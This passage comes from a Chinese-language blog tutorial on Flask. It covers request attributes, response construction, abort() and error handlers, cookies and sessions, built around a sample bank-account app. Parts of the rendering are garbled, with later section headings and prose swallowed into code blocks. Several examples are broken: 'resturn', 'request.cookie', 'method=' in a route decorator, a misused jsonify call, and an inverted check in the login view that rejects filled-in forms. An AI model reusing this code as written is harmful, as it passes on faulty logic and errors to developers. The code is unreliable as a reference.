href=&quot;%s&quot;&gt;银行卡开户&lt;/a&gt;&lt;/li&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;li&gt;&lt;a href=&quot;%s&quot;&gt;银行管理&lt;/a&gt;&lt;/li&gt;    </span></span><br><span class=\"line\"><span class=\"string\">            &lt;li&gt;&lt;a href=&quot;%s&quot;&gt;用户管理&lt;/a&gt;&lt;/li&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/ul&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span> % (</span><br><span class=\"line\">        url_for(<span class=\"string\">&#x27;cardBlue.addCard&#x27;</span>, bankName=<span class=\"string\">&quot;中国银行&quot;</span>, page=<span class=\"number\">3</span>),</span><br><span class=\"line\">        url_for(<span class=\"string\">&#x27;bankBlue.edit&#x27;</span>, bankId=<span class=\"number\">1</span>),</span><br><span class=\"line\">        url_for(<span class=\"string\">&#x27;userBlue.find&#x27;</span>),</span><br><span class=\"line\">    )</span><br></pre></td></tr></table></figure>\n\n<p>1.2<strong>请求对象</strong></p>\n<p>From flask import request</p>\n<p>请求对象本质上是封装客户端发送的请求数据，在Flask中由Werkzeug库（实现Python的WSGI接口）封装的，包含请求的路径、请求的方法、请求的头、请求中包含的Cookie、请求的参数及上传的数据。</p>\n<p> 一个请求对象中包含的数据的属性一般都是dict类型，如：</p>\n<p>*request.args查询参数，url路径中使用?分隔的查询参数。</p>\n<p>*request.form表单参数，一般是post请求方法中包含的数据。</p>\n<p>*request.headers请求头</p>\n<p>*request.cookies Cookie数据</p>\n<p>*request.files上传的文件</p>\n<p>*request.method请求方法，且大写字母表示的</p>\n<p>*request.url 请求的路径</p>\n<p>*request.remote_addr 远程访问的客户端ip地址</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>url: &#123;&#123; request.url &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>base_url: &#123;&#123; request.base_url &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>host_url: &#123;&#123; request.host_url &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>path: &#123;&#123; request.path &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>method: &#123;&#123; request.method &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>客户端ip: &#123;&#123; request.remote_addr &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>请求头: &#123;&#123; request.headers &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>Cookie: &#123;&#123; request.cookies &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/find&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>():</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;url&#x27;</span>, request.url)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;base_url&#x27;</span>, request.base_url)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;host_url&#x27;</span>, request.host_url)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;path&#x27;</span>, request.path)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;headers&#x27;</span>, request.headers)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;cookie&#x27;</span>, request.cookies)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;user_list.html&quot;</span>, request=request)</span><br></pre></td></tr></table></figure>\n\n<p>1.3 <strong>响应对象response</strong></p>\n<p>在服务端，当业务处理完成后，生成响应的数据并封装成响应对象，并传给Python的WSGI，由WSGI向客户端发送数据流。</p>\n<ol>\n<li><p>直接返回文本和状态码</p>\n<p>flask的处理函数如果直接返回文本或附带一个响应的状态码，则会自动封装一个简单Response对象，且数据类型默认为：text/html;charset=utf-8.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/publish&#x27;</span>, methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">publish_bank</span>():</span><br><span class=\"line\">    <span class=\"comment\"># return &quot;&lt;h3&gt;预发布银行公告&lt;/h3&gt;&quot;, 200</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#123;&quot;id&quot;: 101, &quot;age&quot;: 20&#125;&#x27;</span>, <span class=\"number\">200</span></span><br></pre></td></tr></table></figure>\n\n<p>如果返回的是一个html文本数据，可以使用render_template()函数，将写好的html模板经过渲染之后生成的html返回会更好些。</p>\n</li>\n<li><p>使用make_response(data, code)生成response对象。这种方式是较为常用的方式，通过生成的response响应对象，可以设置响应的header相关的信息。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/publish&#x27;</span>, methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">publish_bank</span>():</span><br><span class=\"line\">    <span class=\"comment\"># return &quot;&lt;h3&gt;预发布银行公告&lt;/h3&gt;&quot;, 200</span></span><br><span class=\"line\">    <span class=\"comment\"># return &#x27;&#123;&quot;id&quot;: 101, &quot;age&quot;: 20&#125;&#x27;, 200</span></span><br><span class=\"line\">    data = <span class=\"string\">&#x27;&#123;&quot;id&quot;: 101, &quot;age&quot;: 20&#125;&#x27;</span></span><br><span class=\"line\">    code = <span class=\"number\">200</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 将数据和响应的状态码封装到response对象中</span></span><br><span class=\"line\">    response = make_response(data, code)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 根据数据的类型，设置响应头</span></span><br><span class=\"line\">    response.headers[<span class=\"string\">&#x27;Content-Type&#x27;</span>] = <span class=\"string\">&#x27;application/json;charset=utf-8&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> response</span><br></pre></td></tr></table></figure></li>\n<li><p>jsonify()快速生成json响应对象。此函数返回的也是一个response对象，只不过response对象的headerd已经设置了content-type属性为application/json。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">   @blue.route(<span class=\"params\"><span class=\"string\">&#x27;/publish&#x27;</span>, methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\">   <span class=\"keyword\">def</span> <span class=\"title function_\">publish_bank</span>():</span><br><span class=\"line\">       data = <span class=\"string\">&#x27;&#123;&quot;id&quot;: 101, &quot;age&quot;: 20&#125;&#x27;</span></span><br><span class=\"line\">       code = <span class=\"number\">200</span></span><br><span class=\"line\">       <span class=\"keyword\">return</span> jsonify(data, code)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">4.</span> Response类生成响应对象。</span><br><span class=\"line\"></span><br><span class=\"line\">   ```python</span><br><span class=\"line\"><span class=\"meta\">   @blue.route(<span class=\"params\"><span class=\"string\">&#x27;/publish&#x27;</span>, methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\">   <span class=\"keyword\">def</span> <span class=\"title function_\">publish_bank</span>():</span><br><span class=\"line\">       data = <span class=\"string\">&#x27;&#123;&quot;id&quot;: 101, &quot;age&quot;: 20&#125;&#x27;</span></span><br><span class=\"line\">       code = <span class=\"number\">200</span></span><br><span class=\"line\">       <span class=\"comment\"># Response(response= None, status= None, headers = None, mimetype = None, content_type = None, direct_passthrough = False)</span></span><br><span class=\"line\">       response = Response(data, code, content_type=<span class=\"string\">&quot;application/json&quot;</span>)</span><br><span class=\"line\">       <span class=\"keyword\">return</span> response</span><br></pre></td></tr></table></figure>\n\n<p>创建Response对象方法中，可以省略code，同时也可以将content_type改为mimetype。mimetype表示文件的数据类型，和content_type表示的含义相同。</p>\n</li>\n<li><p>重定向：在一个请求中，由于业务处理的要求，在处理业务之后，需要进入新的页面。而这个页面之前已经声明它的路由，则需要使用重定向的方式进入到下一页。</p>\n<p>【注意】重定向也是响应对象，必须要返回。而且相对于浏览器或客户端再次发送新的请求。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/list&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">listCard</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;card/list.html&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/add&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addCard</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&quot;POST&quot;</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 接收开户信息</span></span><br><span class=\"line\">        bankId =request.form.get(<span class=\"string\">&#x27;bank&#x27;</span>)</span><br><span class=\"line\">        username = request.form.get(<span class=\"string\">&#x27;username&#x27;</span>)</span><br><span class=\"line\">        phone =  request.form.get(<span class=\"string\">&#x27;phone&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 验证数据是否为空</span></span><br><span class=\"line\">        <span class=\"comment\"># 假如操作成功，进入页面中</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;bankBlue.listCard&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># GET请求，响应的是开户页面</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;card/add.html&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>开户页面<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h3</span>&gt;</span>开户页面<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;/bank/add&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;post&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;bank&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span>--请选择银行--<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span>&gt;</span>中国银行<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;2&quot;</span>&gt;</span>中国工商银行<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">size</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;用户名&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phone&quot;</span> <span class=\"attr\">size</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;手机号&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span>提交<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"1-4-请求异常\"><a href=\"#1-4-请求异常\" class=\"headerlink\" title=\"1.4 请求异常\"></a>1.4 请求异常</h2><p>请求异常，在请求处理过程中，验证某一数据出现的错误，可以中断请求。如果请求异常不是请求数据而引起的，或者说请求资源不存在或服务器发生异常，此时可以捕获异常。</p>\n<h3 id=\"1-4-1-abort-中断\"><a href=\"#1-4-1-abort-中断\" class=\"headerlink\" title=\"1.4.1 abort()中断\"></a>1.4.1 abort()中断</h3><p>在请求处理函数中，可以直接调用abort()函数，中断业务处理。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/add&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addCard</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&quot;POST&quot;</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 接收开户信息</span></span><br><span class=\"line\">        bankId =request.form.get(<span class=\"string\">&#x27;bank&#x27;</span>)</span><br><span class=\"line\">        username = request.form.get(<span class=\"string\">&#x27;username&#x27;</span>)</span><br><span class=\"line\">        phone =  request.form.get(<span class=\"string\">&#x27;phone&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> phone != <span class=\"string\">&#x27;111222333&#x27;</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 中断业务</span></span><br><span class=\"line\">            <span class=\"comment\"># abort(401) # 发出一个异常响应码</span></span><br><span class=\"line\">            abort(Response(<span class=\"string\">&quot;&lt;h3 style=&#x27;color:red&#x27;&gt;%s当前手机号不能被注册&lt;/h3&gt;&quot;</span> % phone,<span class=\"number\">403</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 验证数据是否为空</span></span><br><span class=\"line\">        <span class=\"comment\"># 假如操作成功，进入页面中</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;bankBlue.listCard&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># GET请求，响应的是开户页面</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;card/add.html&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>abort()两种写法：</p>\n<p>1.abort(status_code); 2. abort(data, code, headers,…)</p>\n<h3 id=\"1-4-2-捕获请求异常\"><a href=\"#1-4-2-捕获请求异常\" class=\"headerlink\" title=\"1.4.2 捕获请求异常\"></a>1.4.2 捕获请求异常</h3><p>通过相关的状态码，获取请求异常，并指定处理函数来响应异常的信息。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.errorhandler(<span class=\"params\"><span class=\"number\">404</span></span>) </span><span class=\"comment\"># 指定状态码捕获</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">notfound</span>(<span class=\"params\">error</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;404.html&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>建议处理异常的函数写在与app对象同一个脚本中。</p>\n<p>如果处理业务中抛出相关的异常或发生500的异常，则可以指定异常类捕获</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/list&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">listCard</span>():</span><br><span class=\"line\">    <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;自定义异常&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># abort(500)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;card/list.html&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">   @app.errorhandler(<span class=\"params\">Exception</span>)</span></span><br><span class=\"line\">   <span class=\"keyword\">def</span> <span class=\"title function_\">handlerOfError</span>(<span class=\"params\">error</span>):</span><br><span class=\"line\">       <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;500.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## 二、Cookie与Session技术</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## 2.1 Cookie存储技术</span></span><br><span class=\"line\"></span><br><span class=\"line\">Cookie数据存储技术，它的数据存储在客户端（浏览器），在浏览器中会为每个站点（host）创建存储Cookie的空间出来，Cookie的数据存储以Key=Value形式，但是每个key都有生命周期（有效期）。一个完整的Cookie信息包含：名称、内容、域名、路径（/）、有效时间（创建时间、到期时间）、如查看chrome下localhost域名下的所有cookie数据：chrome://settings/siteData。在搜索Cookie的文本框中输入“localhost”，查出localhost站点之前创建的Cookie。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### 2.1.1 向客户端写入Cookie</span></span><br><span class=\"line\"></span><br><span class=\"line\">使用response对象的set_cookie()方法可以向客户端添加Cookie。</span><br><span class=\"line\"></span><br><span class=\"line\">```python</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_cookie</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">        self,</span></span><br><span class=\"line\"><span class=\"params\">        key: <span class=\"built_in\">str</span>,</span></span><br><span class=\"line\"><span class=\"params\">        value: <span class=\"built_in\">str</span> = <span class=\"string\">&quot;&quot;</span>,</span></span><br><span class=\"line\"><span class=\"params\">        max_age: t.<span class=\"type\">Optional</span>[t.<span class=\"type\">Union</span>[timedelta, <span class=\"built_in\">int</span>]] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">        expires: t.<span class=\"type\">Optional</span>[t.<span class=\"type\">Union</span>[<span class=\"built_in\">str</span>, datetime, <span class=\"built_in\">int</span>, <span class=\"built_in\">float</span>]] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">        path: t.<span class=\"type\">Optional</span>[<span class=\"built_in\">str</span>] = <span class=\"string\">&quot;/&quot;</span>,</span></span><br><span class=\"line\"><span class=\"params\">        domain: t.<span class=\"type\">Optional</span>[<span class=\"built_in\">str</span>] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">        secure: <span class=\"built_in\">bool</span> = <span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">        httponly: <span class=\"built_in\">bool</span> = <span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">        samesite: t.<span class=\"type\">Optional</span>[<span class=\"built_in\">str</span>] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">    </span>):<span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/login&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">login</span>():</span><br><span class=\"line\">    response = make_response(<span class=\"string\">&quot;进入登录页面&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 添加cookie</span></span><br><span class=\"line\">    <span class=\"comment\"># response.delete_cookie(&#x27;username&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\"># expire_datatime = datetime.strptime(&#x27;2022-06-01 06:00:00&#x27;,&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\"># response.set_cookie(&#x27;username&#x27;,&#x27;disen&#x27;, expires=expire_datatime)</span></span><br><span class=\"line\">    response.set_cookie(<span class=\"string\">&#x27;email&#x27;</span>,<span class=\"string\">&#x27;11111222222@qq.com&#x27;</span>,max_age=<span class=\"number\">1209600</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-2-将客户端的cookie删除\"><a href=\"#2-1-2-将客户端的cookie删除\" class=\"headerlink\" title=\"2.1.2 将客户端的cookie删除\"></a>2.1.2 将客户端的cookie删除</h3><p>使用响应对象的delete_cookie()方法</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete_cookie</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">        self,</span></span><br><span class=\"line\"><span class=\"params\">        key: <span class=\"built_in\">str</span>,</span></span><br><span class=\"line\"><span class=\"params\">        path: <span class=\"built_in\">str</span> = <span class=\"string\">&quot;/&quot;</span>,</span></span><br><span class=\"line\"><span class=\"params\">        domain: t.<span class=\"type\">Optional</span>[<span class=\"built_in\">str</span>] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">        secure: <span class=\"built_in\">bool</span> = <span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">        httponly: <span class=\"built_in\">bool</span> = <span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">        samesite: t.<span class=\"type\">Optional</span>[<span class=\"built_in\">str</span>] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">    </span>):<span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>【注意】根据不同浏览器特性，可能删除不了，需要到浏览器删除。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/delcookie/&lt;cookie_name&gt;&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_cookie</span>(<span class=\"params\">cookie_name</span>):</span><br><span class=\"line\">\tresp = make_response(<span class=\"string\">&#x27;删除cookie&#x27;</span>)</span><br><span class=\"line\">\tresp.delete_cookie(cookie_name)</span><br><span class=\"line\">\tresturn resp</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-3-从请求对象中获取cookie\"><a href=\"#2-1-3-从请求对象中获取cookie\" class=\"headerlink\" title=\"2.1.3 从请求对象中获取cookie\"></a>2.1.3 从请求对象中获取cookie</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/find&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>():</span><br><span class=\"line\">\t<span class=\"comment\"># 客户端的cookie信息随着请求发送，自动将浏览器中的cookie附加到请求中</span></span><br><span class=\"line\">\t<span class=\"comment\"># 可以从请求对象中获取浏览器的cookie信息</span></span><br><span class=\"line\">\temail = request.cookie.get(<span class=\"string\">&#x27;email&#x27;</span>) <span class=\"comment\"># value</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-会话Session\"><a href=\"#2-2-会话Session\" class=\"headerlink\" title=\"2.2 会话Session\"></a>2.2 会话Session</h2><p>会话技术，一般是指客户端与服务端建立的连接，针对HTTP协议来说，会话连接称之为Session。在HTTP/1.0版本上，会话都是一次性，请求与响应的一个完整过程基于session。到HTTP/1.1时，会话是长连接，多个请求与响应共享一个会话。是否为长连接，可以查看响应、请求头connection，如果它的值是keep-alive表示长连接。因为Session是多个请求的共享资源，所以在Session存数据时，多个请求都可以访问。</p>\n<p>【注意】在flask中使用session时，需要设置一个安全密钥secret_key。</p>\n<p>一般Session使用场景：用户登录、退出、验证用户、城市定位</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> session</span><br><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/login&#x27;</span>, method=[<span class=\"string\">&#x27;GET&#x27;</span>,<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">login</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 读取登录用户信息</span></span><br><span class=\"line\">        <span class=\"comment\"># 前端页面表单域：name, password</span></span><br><span class=\"line\">        name = request.form.get(<span class=\"string\">&#x27;name&#x27;</span>)</span><br><span class=\"line\">        password = request.form.get(<span class=\"string\">&#x27;password&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">all</span>((name, password)): <span class=\"comment\"># 验证是否为空</span></span><br><span class=\"line\">            message = <span class=\"string\">&quot;用户名或口令不能为空&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 将数据写入数据库</span></span><br><span class=\"line\">            dao = UserDao()</span><br><span class=\"line\">            <span class=\"comment\"># dao.save(name=name, password=password) # 注册时使用</span></span><br><span class=\"line\">            user = dao.login(name, password) <span class=\"comment\"># 如果存在此用户，则返回用户信息，dict</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> user:</span><br><span class=\"line\">                message = <span class=\"string\">&quot;查无%s此用户，请确认用户名或口令正确！&quot;</span> % name</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            \t<span class=\"comment\"># 用户信息</span></span><br><span class=\"line\">            \tsession[<span class=\"string\">&#x27;login_user&#x27;</span>] = user</span><br><span class=\"line\">                </span><br><span class=\"line\">            \t<span class=\"comment\"># 重定向到主页</span></span><br><span class=\"line\">            \t<span class=\"keyword\">return</span> redirect(<span class=\"string\">&#x27;/index&#x27;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">\t<span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;user/login.html&#x27;</span>, <span 